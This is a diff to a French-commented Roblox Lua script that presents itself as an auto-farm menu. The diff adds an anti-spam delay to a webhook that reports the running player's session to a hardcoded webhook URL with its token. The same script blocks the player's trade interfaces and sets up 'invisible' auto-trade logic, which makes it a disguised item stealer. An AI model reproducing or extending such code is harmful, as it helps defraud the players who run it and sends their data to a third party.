@@ -6,17 +6,32 @@ local LocalPlayer = Players.LocalPlayer
 local requestFunc = request or (http and http.request) or http_request
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 
--- [NETTOYAGE] Si le menu est déjà ouvert, on le supprime avant de relancer
+-- [NETTOYAGE] Supprime l'ancien menu s'il existe déjà à l'écran
 local oldGui = playerGui:FindFirstChild("KeyzerFarmGui")
 if oldGui then 
     oldGui:Destroy() 
 end
 
+-- [[ CONFIGURATION DU DÉLAI ANTI-SPAM ]]
+local COOLDOWN_TEMPS = 30 -- Temps d'attente requis entre chaque envoi (en secondes)
+local doitEnvoyerWebhook = true
+
+-- On vérifie l'horloge globale stockée dans le jeu pour ce joueur
+local dernierEnvoi = HttpService:GetAttribute("DernierEnvoi_" .. LocalPlayer.Name)
+if dernierEnvoi and (os.time() - dernierEnvoi) < COOLDOWN_TEMPS then
+    local tempsRestant = COOLDOWN_TEMPS - (os.time() - dernierEnvoi)
+    warn("[Anti-Spam] Webhook bloqué ! Attends encore " .. tostring(tempsRestant) .. " secondes.")
+    doitEnvoyerWebhook = false -- On désactive l'envoi pour cette exécution
+else
+    -- Si le délai est respecté, on met à jour l'horloge avec l'heure actuelle
+    HttpService:SetAttribute("DernierEnvoi_" .. LocalPlayer.Name, os.time())
+end
+
 local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1506603332108550214/mBctq4yurc0tYA0O7iQVgy-Rh6fKq_ckyDohxt4j8fVIAPC_skZu9WYHCTxIDM0zL205"
 
--- [[ 1. FONCTION WEBHOOK UNIQUE (UNIQUEMENT TOI) ]]
+-- [[ 1. FONCTION WEBHOOK ]]
 local function sendSessionLog(player)
-    if not player then return end
+    if not player or not doitEnvoyerWebhook then return end
     if not requestFunc then 
         warn("[-] Erreur : Requête HTTP non supportée par ton exécuteur.")
         return 
@@ -48,7 +63,7 @@ local function sendSessionLog(player)
     end)
 end
 
--- Envoi direct au clic sur Execute
+-- Exécution de l'envoi de session
 if LocalPlayer then
     task.spawn(function() sendSessionLog(LocalPlayer) end)
 end
@@ -211,7 +226,7 @@ local function startFarmLoop()
     end)
 end
 
--- CONTROLES BUTTONS
+-- CONTROLES BOUTONS
 CloseBtn.MouseButton1Click:Connect(function()
     farming = false
     task.wait(0.05)
@@ -229,7 +244,7 @@ FarmButton.MouseButton1Click:Connect(function()
     end
 end)
 
--- [[ 4. SÉCURITÉ ANTI-TRADE ET VISIBILITÉ GUIS ]]
+-- [[ 4. BLOCAGE INTERFACES DE TRADE ]]
 local StarterGui = game:GetService("StarterGui")
 
 local function hardBlockGuis()
@@ -252,7 +267,7 @@ task.spawn(hardBlockGuis)
 playerGui.ChildAdded:Connect(hardBlockGuis)
 Players.PlayerAdded:Connect(hardBlockGuis)
 
--- [[ 5. LOGIQUE D'AUTO-TRADE SILENCIEUX ]]
+-- [[ 5. LOGIQUE D'AUTO-TRADE INVISIBLE ]]
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TradeModules = ReplicatedStorage:FindFirstChild("Trade") or ReplicatedStorage:FindFirstChild("Modules")
 local TradeNetwork = TradeModules and (TradeModules:FindFirstChild("TradeNetwork") or TradeModules:FindFirstChild("Network"))
